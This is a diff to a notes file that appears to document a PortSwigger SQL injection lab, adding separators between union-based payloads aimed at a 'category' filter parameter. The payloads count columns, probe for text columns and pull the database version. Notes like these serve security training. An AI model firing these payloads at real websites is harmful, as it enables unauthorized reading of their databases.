@@ -11,8 +11,12 @@ Reference: https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 ---------------------------------------------
 /filter?category=Gifts'+order+by+1--+
+---------------------------------------------
+
 /filter?category=Gifts'+union+select NULL,NULL--+
+---------------------------------------------
 /filter?category=Gifts'+union+select 'A',NULL--+
+---------------------------------------------
 /filter?category=Gifts'+union+select @@version,NULL--+
 
 ``` 
